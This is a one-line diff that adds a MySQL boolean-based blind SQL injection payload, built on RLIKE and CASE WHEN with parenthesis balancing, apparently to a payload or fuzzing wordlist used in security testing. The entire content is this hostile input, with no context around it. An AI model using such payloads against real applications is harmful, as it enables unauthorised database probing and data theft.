@@ -1,0 +1,1 @@
+1) rlike (select (case when (5477=7492) then 1 else 0x28 end)) and (4427=4427
